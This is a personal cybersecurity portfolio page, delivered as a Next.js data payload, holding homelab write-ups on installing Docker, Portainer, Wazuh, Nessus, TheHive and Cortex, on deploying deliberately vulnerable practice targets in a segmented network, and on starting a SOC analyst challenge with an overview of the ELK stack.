1:"$Sreact.fragment"
2:I[9304,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"ThemeProvider"]
3:I[9241,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"CyberHeader"]
4:I[7555,[],""]
5:I[1295,[],""]
6:I[1024,["542","static/chunks/542-9c169102c7286aba.js","838","static/chunks/838-83c262eea6b250cb.js","345","static/chunks/app/not-found-f26a84874965db45.js"],"default"]
7:I[3063,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"Image"]
8:I[6874,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],""]
a:I[9665,[],"OutletBoundary"]
d:I[9665,[],"ViewportBoundary"]
f:I[9665,[],"MetadataBoundary"]
11:I[6614,[],""]
:HL["/_next/static/css/9771aacc16142aba.css","style"]
:HL["/_next/static/css/b5c3a1bf19425f6c.css","style"]
0:{"P":null,"b":"gB8xjAs73Ya8I_-QXZr5a","p":"","c":["","projects","ubuntu-server-docker-portainer",""],"i":false,"f":[[["",{"children":["projects",{"children":[["slug","ubuntu-server-docker-portainer","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/9771aacc16142aba.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/b5c3a1bf19425f6c.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","suppressHydrationWarning":true,"children":[["$","head",null,{"children":["$","script",null,{"defer":true,"src":"https://cloud.umami.is/script.js","data-website-id":"1c0f224c-1fe0-4093-a4e2-c43cb8c84bfa"}]}],["$","body",null,{"className":"__className_f367f3","children":["$","$L2",null,{"attribute":"class","defaultTheme":"light","disableTransitionOnChange":true,"children":["$","div",null,{"className":"flex min-h-screen flex-col","children":[["$","$L3",null,{}],["$","main",null,{"className":"flex-1 pt-16","children":["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L6",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"bg-background py-5 border-t border-border","children":["$","div",null,{"className":"container mx-auto px-4 md:px-6","children":[["$","div",null,{"className":"grid grid-cols-1 md:grid-cols-3 gap-4","children":[["$","div",null,{"className":"space-y-2","children":[["$","div",null,{"className":"flex items-center","children":["$","div",null,{"className":"relative w-[3.6rem] h-[3.6rem]","children":["$","$L7",null,{"src":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png","alt":"117 SECOPS Logo","fill":true,"className":"object-contain"}]}]}],["$","p",null,{"className":"text-sm text-muted-foreground max-w-xs","children":"Cybersecurity professional specializing in protecting digital assets from evolving threats."}],["$","div",null,{"className":"pt-0","children":["$","a",null,{"href":"https://www.linkedin.com/in/otori-samson/","target":"_blank","rel":"noopener noreferrer","children":"Contact Me","className":"inline-flex items-center justify-center whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-9 rounded-md px-3 cyber-border bg-transparent text-foreground hover:bg-purple-600 hover:text-white","ref":null}]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Quick Links"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"children":["$","$L8",null,{"href":"/","className":"text-sm text-muted-foreground hover:text-primary","children":"Home"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/blog","className":"text-sm text-muted-foreground hover:text-primary","children":"Blog"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/projects","className":"text-sm text-muted-foreground hover:text-primary","children":"Projects"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/portfolio","className":"text-sm text-muted-foreground hover:text-primary","children":"Portfolio"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/about","className":"text-sm text-muted-foreground hover:text-primary","children":"About"}]}]]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Areas of Expertise"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"className":"text-sm text-muted-foreground","children":"Security Assessment"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Penetration Testing"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Secure Development"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Incident Response"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Compliance"}]]}]]}]]}],["$","div",null,{"className":"border-t border-border mt-5 pt-3 flex flex-col md:flex-row justify-between items-center","children":["$","p",null,{"className":"text-sm text-muted-foreground","children":["Â© ",2025," Samson's. Personal cybersecurity portfolio."]}]}]]}]}]]}]}]}]]}]]}],{"children":["projects",["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","ubuntu-server-docker-portainer","d"],["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L9","$undefined",null,["$","$La",null,{"children":["$Lb","$Lc",null]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","q7AQzJkBTvyYzm4ELvxDP",{"children":[["$","$Ld",null,{"children":"$Le"}],null]}],["$","$Lf",null,{"children":"$L10"}]]}],false]],"m":"$undefined","G":["$11","$undefined"],"s":false,"S":true}
12:I[2238,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","885","static/chunks/885-ced1f1eec30031e3.js","150","static/chunks/150-f30d5c80752f43a9.js","419","static/chunks/app/projects/%5Bslug%5D/page-e7fed7e0529d1ffc.js"],"default"]
13:T1417,
## Ubuntu Server, Docker and Portainer Installation in My Homelab

After successfully segmenting my home lab using VLANs, the next major step was to deploy an Ubuntu Server dedicated to containerized tools using Docker and Portainer. Instead of using the Proxmox console directly throughout the process, I took a more modular and realistic approach: I SSHed into the Ubuntu server remotely from another laptop running Parrot OS. This Parrot OS laptop was physically connected to my Cisco switch using an RJ45 cable and had already been assigned to VLAN 5, the dedicated Security Tools segment in my lab.

The entire flow unfolded like this:

First, I logged into Proxmox and created a new virtual machine. I named it something like UbuntuServer-docker and assigned it to VLAN 30, which is where all my Docker/container workloads reside. I used the Ubuntu Server live image, selected ZFS as the storage type, and allocated 16GB RAM to ensure smooth performance.

During the Ubuntu installation, I carefully observed the DHCP setup, a critical step. I confirmed that the system automatically received an IP address, which meant my OPNsense DHCP service was working flawlessly across VLAN 30. This gave me confidence that VLAN isolation and interconnectivity were functioning as intended.

As I proceeded through the installer, I enabled OpenSSH so I could manage the server from my Parrot OS machine instead of using the Proxmox console. Once the installation was complete and the VM rebooted, I tested connectivity from Parrot OS by running a simple ping to the new server. It responded successfully.

I then established an SSH session using:

```bash
ssh <pilotvader>@<10.10.30.100>
```

Inside the SSH session, I manually installed Docker. This included:

1. Removing conflicting packages (if any)
2. Setting up the Docker repository
3. Installing Docker Engine
4. Verifying with `sudo docker run hello-world`

The confirmation message "Hello from Docker!" appeared, a satisfying sign that the installation was successful. Running `sudo docker ps` showed no running containers, just as expected.

Next, I proceeded to install Portainer (Community Edition) by:

1. Creating a Docker volume:

```bash
sudo docker volume create portainer_data
```

2. Running the Portainer container:

```bash
sudo docker run -d -p 8000:8000 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:latest
```

Once the container was running, I opened a browser on my Parrot OS laptop and navigated to:

```
https://<10.10.30.100>:9443
```

There, I set my Portainer admin password and accessed the local environment, where I could already see two containers:

1. The Portainer container itself
2. The hello-world container Docker had used for verification

To clean up, I deleted the hello-world container via the Portainer interface.

At this point, my Ubuntu Server in VLAN 30 was now a fully functional Docker host, securely managed over VLAN 5 from my Parrot OS laptop. The whole setup reflected a real-world SOC design, segmentation, remote management, container orchestration, and will serve as the backbone for deploying security tools like Wazuh, TheHive, and Arkime in future phases.

## Conclusion

The installation of Ubuntu Server, Docker, and Portainer has laid a solid foundation for the Security Tools section of my home lab. A notable part of this setup was accessing the Ubuntu Server via SSH from a Parrot OS laptop that was physically connected, via RJ45 cable, to a specifically configured port on my Cisco switch assigned to VLAN 5 (Security Tools). This deliberate port configuration allowed the laptop to join the segmented network, and the successful DHCP assignment from my OPNsense firewall confirmed that the VLAN setup and network services were functioning properly. This mirrored the physical isolation strategy used by Gerard O'Brien and demonstrated secure out-of-band management in a segmented environment.

With Portainer deployed on top of Docker, I now have a streamlined interface to manage containers across different network zones. This sets the stage for the next phase, where I'll deploy vulnerable applications like Metasploitable2, DVWA, and WebGoat for simulation and detection exercises. Before moving forward, it's crucial to ensure all infrastructure components, network segmentation, firewall configurations, and remote management, are fully operational. This step-by-step approach highlights the value of building a secure and modular lab environment from the ground up.

Credits: This project was independently implemented by Samson Otori, drawing conceptual inspiration from Gerard O'Brien's Ultimate Cybersecurity Lab series.

Here's a link to his YouTube channels:
- [Gerard O'Brien's Channel](https://www.youtube.com/@techwithgerard)

---

**Tags:** #UbuntuServer #Docker #Portainer #SSH #VLAN #Containerization #Homelab #Proxmox #Cybersecurity #Infrastructure #Virtualization #NetworkSegmentation #SecurityTools #RemoteManagement #ContainerOrchestration 14:T1c86,
## Project 4.4: Integrating Wazuh SIEM/XDR and Nessus in a Cybersecurity Home Lab

### Building the SIEM Foundation: Wazuh Server Deployment

Continuing from the previous episodes of my cybersecurity home lab journey, I entered the next to introduce Wazuh as the SIEM and XDR solution for telemetry collection, log correlation, and detection engineering. I provisioned a new Ubuntu server virtual machine on Proxmox with 4 vCPUs, 8GB of RAM, and 160GB of disk space, ensuring it resided within VLAN 5 (my security tools network) using the IP 10.10.5.51/24. The Wazuh installation process was straightforward. After setting a static IP and configuring DNS and gateway entries, I initiated a basic update and upgrade cycle, then ran the official Wazuh installation script from their GitHub repository.

Once the installation was completed, I accessed the Wazuh dashboard via HTTPS at https://10.10.5.51, authenticated using the auto-generated credentials, and confirmed a successful deployment. With the Wazuh manager operational, the next step was deploying agents across key systems in the lab.

<InlineGallery images={wazuh-server-deployment} title="Wazuh Server Deployment" />

### Deploying Agents: Parrot OS and Docker Server Integration

The first endpoint I configured was my Parrot OS. I elevated to root and ran the prescribed commands to add the Wazuh repository, perform an update, and install the agent. I edited the agent configuration to point it at the Wazuh manager IP and verified connectivity. Upon launching the agent, it registered on the Wazuh dashboard and began transmitting logs shortly after.

I replicated the same process on my Ubuntu Docker server (10.10.30.100), again ensuring root privileges, repository addition, and agent configuration. I initiated the agent and confirmed its visibility on the Wazuh interface. To extend observability into containerised environments, I proceeded to install the Wazuh Docker Listener and configured the Docker API for telemetry ingestion. I appended the required JSON configuration into the agent's config file, restarted the service, and enabled the module on the Wazuh dashboard under Settings > Modules > Docker Listener. Container-level logs began appearing as I restarted a few test containers to validate.

<InlineGallery images={agent-installation} title="Agent Installation Process" />

### OPNsense Firewall Agent Issues: Encountering the PID File Roadblock

With both endpoint systems operational in Wazuh, I turned my attention to integrating my OPNsense firewall (192.168.1.1) running on dedicated hardware. This step diverged significantly from the Linux-based agents, as it required enabling FreeBSD repositories and handling configuration in a constrained BSD environment. I SSHed into OPNsense, enabled SSH under System > Advanced, and modified the FreeBSD.conf file to set enabled=YES. Unlike the tutorial, I found only the freebsd.conf file available, not pfsense.conf, due to architectural differences between OPNsense and pfSense.

Following the installation instructions, I attempted to run the agent-auth binary to register the agent with the manager. However, I encountered a persistent error: agent-auth: CRITICAL (1212): Unable to create PID file. This indicated a permission or filesystem-level issue preventing the Wazuh agent from properly initialising. Further troubleshooting revealed that the ossec user and group did not exist by default. Attempts to assign ownership using chown -R ossec:ossec /var/ossec returned "illegal group name" errors.

I manually verified write permissions by creating and removing test files under /var/ossec, which confirmed basic functionality. Despite that, the Wazuh agent daemon (wazuh-agentd) consistently failed to start. Configuration and log file reviews pointed to missing or incompatible startup routines specific to FreeBSD. I eventually confirmed that even after enabling FreeBSD package support and properly configuring ossec.conf to include the manager IP, the agent appeared on the Wazuh dashboard but failed to show "Active" status.

At this point, I decided to temporarily pause work on the OPNsense agent integration. The issue remained unresolved, likely due to deeper compatibility mismatches or required kernel parameters not present on the OPNsense BSD environment. I plan to revisit this with a custom-built FreeBSD agent installation script or by manually creating missing users and startup routines. But if anyone has encountered this issue, please reach out to me with suggestions, I'll really appreciate.

<InlineGallery images={opnsense-setup} title="OPNsense Firewall Configuration" />

### Deploying Nessus: Introducing Vulnerability Scanning to the Lab

With the SIEM side in partial production, I progressed to deploying Nessus for vulnerability scanning. I created a new Ubuntu VM on Proxmox with 4 vCPUs, 4 GB RAM, and 40 GB disk, assigning it the IP address 10.10.5.52/24 within VLAN 5. After configuring static networking and enabling SSH, I logged in and ran the commands to download the latest Nessus Debian package. I installed it using dpkg and started the nessusd service.

Accessing Nessus via the browser at https://10.10.5.52:8834 allowed me to register for the Essentials version and input the activation key. The platform then began downloading its full set of plugins and signature files. Once installation was completed, I created a quick scan targeting the Metasploitable2 VM. Even with the basic scan template, the results after the scan show that it was successful even with limited information, confirming its functionality.

<InlineGallery images={nessus-deployment} title="Nessus Vulnerability Scanner Setup" />

### Conclusion

At this point, I had a partially complete security monitoring stack within my home lab. Wazuh was successfully collecting logs from my Parrot OS and Docker machines and even parsing Docker container activity. Nessus was active and ready to scan targets across VLAN 5. However, OPNsense integration remained incomplete due to agent startup issues tied to BSD permission handling. I plan to circle back to this issue later with a deeper understanding of BSD service management or possibly using Syslog forwarding as a temporary workaround.

This project showcases the real-world challenges of building a hybrid monitoring environment, integrating both Linux and BSD-based systems into a centralised SIEM. It's a valuable case study for anyone deploying Wazuh in a segmented network and dealing with heterogeneous operating systems. My next step will be to document the resolution of the OPNsense agent issue and expand Wazuh's use to include alert rule tuning and dashboard customisation.

Stay tuned for the next stage of this project as we integrate more detection and response tools.

**Credits:** This walkthrough is based on Episode 3 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien. While the steps closely followed his guidance, the project was independently implemented by Samson Otori, with custom network configurations and host assignments tailored to fit a pre-existing VLAN-segmented lab environment.

Here's a link to his YouTube channels:

[Gerard O'Brien's Channel](https://www.youtube.com/watch?v=ytWZ6OrFEQE&list=PL3ljjyal211AbTqlxSo6CGBiVqsXw8wrp&index=9) 15:T150d,
## Project 4.7: TheHive & Cortex Deployment in My Cybersecurity Home Lab

### Overview

With the foundation of my segmented cybersecurity home lab steadily taking shape, the next step was to integrate an incident response and analysis layer. For this stage, I deployed TheHive and Cortex, two powerful, open-source tools designed for incident management, case collaboration, and automated analysis.

This build forms a critical part of my SOC workflow. TheHive serves as a centralized incident response platform, while Cortex allows for automated enrichment and analysis of observables. Together, they streamline investigations, improve collaboration, and create a more responsive detection and response cycle in my lab environment.

### Deployment Approach

While TheHive and Cortex can be installed directly on a Linux host or via automated scripts, I opted for a Docker-based deployment through Portainer for speed, maintainability, and container isolation. The process began with pulling the official Docker Compose configuration from TheHive documentation, which includes all required services. TheHive, Cortex, Cassandra, and Elasticsearch pre-configured to work together.

After logging into Portainer, I created a new stack, named it thehive-cortex, pasted in the full Docker Compose configuration, and deployed. Within minutes, the stack creation was successful, and the containers for all components were visible and running.

### Initial Configuration of TheHive

Accessing TheHive was straightforward navigating to my lab IP (10.10.30.100:9000) brought up the login page. Using the default credentials (admin@thehive.local / secret), I entered the admin console, where I began configuring the platform for my lab:

- Created a new organization for my lab environment, representing my segmented network.
- Added a dedicated admin user tied to my internal domain (samson.local), assigning full organization administrator rights.
- Configured a secure password and prepared the account for operational use.

While TheHive offers extensive options for branding, Cortex integration, and case templates, my priority at this stage was preparing the environment to receive alerts from Wazuh, my SIEM/XDR platform deployed earlier in Project 4.3.

<InlineGallery images={thehive-configuration} title="TheHive Initial Configuration and Organization Setup" />

### Cortex Setup

Cortex, accessible on port 9001, was initialized in a similar fashion, logging in with the admin account created earlier and verifying the platform's readiness for analyzer configuration. Cortex will eventually process observables from TheHive cases, performing automated enrichment through analyzers such as VirusTotal, MISP, and WHOIS lookups.

I held off on detailed analyzer configuration for now, as the immediate focus is ensuring proper alert ingestion from Wazuh into TheHive. This will allow me to establish a case-driven workflow where detection events trigger investigations that are enriched automatically via Cortex.

<InlineGallery images={cortex-setup} title="Cortex Platform Initialization and Configuration" />

### Next Steps in the Workflow

Once integration is complete, the workflow will look like this:

1. Wazuh detects a security event in my lab environment.
2. Alert is forwarded to TheHive, where it appears as a case or alert entry.
3. Cortex automatically enriches observables, providing intelligence for quicker triage.
4. Response actions are documented and executed directly from within TheHive.

This aligns with the SOC triage and investigation process used in real-world enterprise environments.

### Conclusion

<p class="mb-4 leading-relaxed">TheHive and Cortex deployment marks the second-to-last stage in the base build of my home lab. The final foundational stage will involve cloud expansion, where I will connect my lab to Azure via a site-to-site VPN. This will extend my testing capabilities, enabling hybrid cloud security monitoring and cross-environment threat detection.</p>

<p class="mb-4 leading-relaxed">Once integration between Wazuh, TheHive, and Cortex is fully operational, I will move into advanced detection engineering, creating adversary simulations in Caldera, monitoring network telemetry in Security Onion, and refining detection rules across my SOC toolchain.</p>

<p class="mb-4 leading-relaxed">This project demonstrates the practical implementation of enterprise-grade incident response tools in a home lab environment, showcasing how Docker-based deployments can simplify complex SOC tool integration while maintaining the flexibility needed for custom configurations and testing scenarios.</p>

<p class="mb-4 leading-relaxed"><strong class="font-semibold">Credits:</strong> This walkthrough is based on Episode 6 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien. While the core methodology followed his structure, the implementation was carried out independently by Samson Otori, with network addressing, VLAN assignments, and system configurations customized for my lab environment.</p>

<p class="mb-4 leading-relaxed">Here's a link to his YouTube channel:</p>

<p class="mb-4 leading-relaxed"><a href="https://www.youtube.com/watch?v=ej6iBrBqZEo" target="_blank" rel="noopener noreferrer" class="text-primary hover:underline">Gerard O'Brien's Channel</a></p>
16:T1b54,
## Project 4.3: Vulnerable Machines Installation (Metasploitable2, DVWA, bWAPP, WebGoat)

Following the successful deployment of Docker and Portainer within VLAN 5 of my home lab, the next step in my cybersecurity lab project was to populate the environment with intentionally vulnerable systems. These systems will serve as practical targets for future testing, detection, and simulation scenarios. In this post, I document the installation and configuration of four key vulnerable systems: Metasploitable2, Damn Vulnerable Web Application (DVWA), bWAPP (Buggy Web Application), and WebGoat.

## Installing Metasploitable2 (MSF2)

Metasploitable2, a vulnerable Linux VM maintained by Rapid7, is designed for penetration testing training and exploits development. It's a go-to machine for beginners looking to understand service-level vulnerabilities.

To begin, I created a new VM in Proxmox with the following details:
- VM ID: 105
- VM Name: Meta-Sploit-Able2
- Media Type: No media
- Disk Interface: IDE
- Network VLAN: VLAN 10 (Vulnerable Machines)

After provisioning the VM shell, I SSHed into the Proxmox server from my Parrot OS laptop and navigated to `/var/lib/vz/images/`. Inside this directory, I created a folder named `105`, matching the VM ID. The reason for SSH access instead of using Proxmox's UI was to maintain an isolated and secure management workflow.

Using wget, I attempted to download the Metasploitable2 image. After resolving a few download errors, I extracted the ZIP file and located the necessary VMDK disk image. This image had to be converted to the QCOW2 format, which is preferred in Proxmox for virtual disk usage. The conversion was done using the qemu-img convert command:

```bash
qemu-img convert -f vmdk -O qcow2 Metasploitable2-Linux.vmdk Metasploitable2-Linux.qcow2
```

Next, I edited the configuration file of VM 105 (`/etc/pve/qemu-server/105.conf`) and pointed the VM to the newly converted QCOW2 disk image. I saved and verified the change from the Proxmox UI under "Hardware."

After powering on the VM, I logged in using the default Metasploitable credentials (`msfadmin` / `msfadmin`). I confirmed the system had joined VLAN 10 correctly by checking its IP address: `10.10.10.100`. I also validated DHCP functionality, DNS resolution, and connectivity to my firewall.

To finish this section, I browsed to the Metasploitable2 IP from my parrot OS and confirmed that its web interface, including DVWA (which comes preinstalled), was accessible.

## Setting Up Docker Networking with MacVLAN

Before continuing to deploy the rest of the vulnerable apps as containers, I had to address Docker's default behavior of assigning container IPs behind a bridge. This would prevent each container from having its own IP on the subnet, which was necessary for scanning them individually with tools like Nessus later on.

To solve this, I logged into Portainer and configured custom Docker networks using MacVLAN. I created two networks:

1. `vlan30-config` (on `10.10.30.0/24`): Provided the container IP range using MACVLAN driver.
2. `vlan30`: Attached directly to VLAN 30 (Docker-Containers).

I retrieved the correct network adapter name using `ip a` command on the Ubuntu Docker host and configured gateway and subnet ranges carefully. This configuration allowed containers to pull individual IPs within VLAN 30, just like physical devices.

To test the new network configuration, I deployed a test Nginx container and confirmed it received a proper IP within the range (e.g., `10.10.30.128`) and was accessible via browser.

## Deploying bWAPP (Buggy Web Application)

bWAPP, which stands for Buggy Web Application, is a PHP/MySQL-based deliberately insecure web app developed for educational purposes. It contains over 100 web vulnerabilities.

Inside Portainer, I added a new container:
- Name: `prod-bwapp`
- Image: Pulled from Docker Hub
- Network: Attached to `vlan30` (configured earlier with MacVLAN)

After deployment, I copied its assigned IP and accessed it via browser. The bWAPP interface loaded successfully. I followed the on-screen prompt to complete the installation, setting up the database via the `/install.php` page. Once installed, the login screen confirmed successful setup.

## Deploying Damn Vulnerable Web Application (DVWA)

DVWA, or Damn Vulnerable Web Application, is another PHP/MySQL web app with known vulnerabilities. It's widely used to practice web-based attacks such as SQL injection, XSS, CSRF, etc.

Just like with bWAPP, I deployed DVWA through Portainer:
- Name: `prod-dvwa`
- Image: Pulled from Docker Hub
- Network: Connected to `vlan30`

Upon deployment, I accessed the IP in the browser. DVWA was reachable, and the default login screen appeared. All services were running correctly within the expected Docker environment.

## Deploying WebGoat

WebGoat is a deliberately insecure Java-based web application maintained by OWASP to teach application security lessons.

Following the same container deployment process:
- Name: `prod-webgoat`
- Image: Pulled from Docker Hub
- Network: Connected to `vlan30`

After the container started, I accessed it via the browser using the assigned IP and port 8080 (e.g., `http://10.10.30.135:8080`). WebGoat loaded successfully, providing access to a series of vulnerable coding labs that simulate real-world scenarios.

## Conclusion

At this point, my Vulnerable Machines segment is fully functional. The following systems are now live and operating on VLAN 10 and VLAN 30:

- Metasploitable2 (IP: `10.10.10.51`) on VLAN 10
- bWAPP, DVWA, and WebGoat as Docker containers with unique IPs on VLAN 30

These machines will now serve as valuable assets for upcoming simulations, scanning, alerting, and response workflows in the lab. Their intentional vulnerabilities are essential for testing detection tools like Wazuh and Nessus, which will be covered in future posts.

If you're following along with this project, make sure your VLAN segmentation, DHCP assignment, and Docker networking are properly configured. Having each container accessible via its own IP is key to realistic and scalable security testing.

Stay tuned for the next stage of this project as we integrate more detection and response tools.

Credits: This walkthrough is based on Episode 2 of the Ultimate Cybersecurity Lab YouTube series by Gerard O'Brien. While the steps closely followed his guidance, the project was independently implemented by Samson Otori, with custom network configurations and host assignments tailored to fit a pre-existing VLAN-segmented lab environment.

Here's a link to his YouTube channels:
- [Gerard O'Brien's Channel](https://www.youtube.com/@techwithgerard)

---

**Tags:** #Metasploitable2 #DVWA #bWAPP #WebGoat #VulnerableMachines #PenetrationTesting #Docker #MacVLAN #VLAN #Homelab #Proxmox #Cybersecurity #SecurityTraining #WebVulnerabilities #Containerization 17:T4f0,
# Introduction to the 30-Days MYDFIR SOC Analyst Challenge

I'm thrilled to announce that I'll be taking on the 30-Days MYDFIR SOC Analyst Challenge! If you're like me, eager to gain hands-on experience in cybersecurity, this challenge is a perfect opportunity.

Over the next 30 days, I'll be learning how to set up and configure the ELK Stack, investigate security incidents, and create dashboards and alerts. Each week focuses on a specific skill, from brute force attack detection to setting up a C2 server.

This challenge is all about turning theory into practice, and by the end, I'll have honed the skills that are crucial for a SOC analyst role. I'll be sharing my progress and insights along the way, so stay tuned for updates.

Join me on this journey as I aim to strengthen my skills and prepare for the real-world demands of cybersecurity. Let's get started!

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=W3ExS2m6B24)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#Cybersecurity #SOCAnalyst #30DayChallenge #PracticalExperience 18:Tb1f,
## Introduction

Today marks the beginning of my hands-on journey in the 30-Day MYDFIR SOC Analyst Challenge. I'm starting with the most fundamental aspect: creating a logical network diagram that will serve as the blueprint for my entire SOC environment.



## Environment Overview

At the heart of my SOC environment lies a carefully planned infrastructure consisting of six key servers. The core components include my Elastic Server for comprehensive log aggregation and analysis, paired with a Kibana Server that handles visualization and dashboard creation. To manage my agents effectively, I've incorporated a Fleet Server into the design. Additionally, a C2 Server has been included to facilitate realistic attack scenario simulations, alongside other supporting infrastructure components that complete my robust environment.

## Implementation Details

The implementation process began with draw.io as my diagramming tool of choice. Through careful consideration, I mapped out the complete environment with attention to detail. The process involved strategic placement of each server component within the network topology, ensuring optimal communication paths. I dedicated significant attention to configuring the private network structure and establishing clear data flow connections between components. Special consideration was given to defining security zones and boundaries, ensuring a secure and well-organized infrastructure.

## Key Insights

Through the process of creating this network diagram, I've gained valuable insights into the practical aspects of SOC architecture. Understanding how components interact within a security operations environment has proven crucial, as this setup mirrors real-world scenarios. The exercise has deepened my understanding of data flow patterns and the importance of comprehensive security monitoring coverage. This foundation will prove invaluable as I progress through the challenge.

## Future Direction

While this network diagram may appear straightforward, it represents the cornerstone of my 30-day journey. This blueprint will guide me through the configuration of monitoring tools, implementation of log forwarding mechanisms, and setup of alert management systems. As I progress, I'll use this foundation to simulate and detect security threats, turning theoretical knowledge into practical experience.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=VAE3aVZi0Go&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=28)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)* 

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #MYDFIRChallenge #Day1 

19:Tb5a,
## Introduction

On Day 2 of the 30-Days MYDFIR SOC Analyst Challenge, I delved into the ELK stack, a powerful trio of toolsâElasticsearch, Logstash, and Kibanaâwidely used in security operations. Together, they form the backbone of log management and analysis, crucial for any Security Operations Center (SOC).

## Understanding Elasticsearch

Elasticsearch is the heart of the stack. It's a robust search engine that stores and indexes massive amounts of log data. This data can range from Windows event logs to firewall logs and beyond. What makes Elasticsearch particularly valuable is its querying power. It uses Elasticsearch Query Language (ESQL), which allows users to search through large datasets quickly and efficiently. The flexibility of Elasticsearch, especially with its RESTful APIs and JSON support, means you can programmatically interact with it from other tools, enhancing its integration into diverse environments.

## The Power of Logstash

Next is Logstash, the powerhouse that processes and transforms incoming data before feeding it into Elasticsearch. Logstash is vital because it allows you to refine your log data, filtering out unnecessary information and only retaining what's critical. This reduces the load on Elasticsearch and helps you manage storage costs more effectively. Additionally, Logstash's ability to parse log fields is a game-changer. For example, you can extract specific details from logs, such as IP addresses, and map them to fields that can be easily queried later. This capability is crucial for security analysts who need to drill down into specific events during investigations.

## Visualizing with Kibana

Finally, Kibana is the interface where all the magic happens. It provides a user-friendly web console for querying data stored in Elasticsearch. Beyond simple querying, Kibana's visualization tools enable the creation of detailed dashboards that can display trends, alert patterns, and more. These dashboards are not only useful for real-time monitoring but also for reporting to executives, who often rely on visual data to understand security posture.

## Conclusion

The ELK stack offers centralized logging, customizable data processing, and scalable architecture, making it an essential tool for SOC analysts. Its integration with various telemetry sources and the ability to create visualizations make it a powerful platform for both real-time monitoring and incident response.

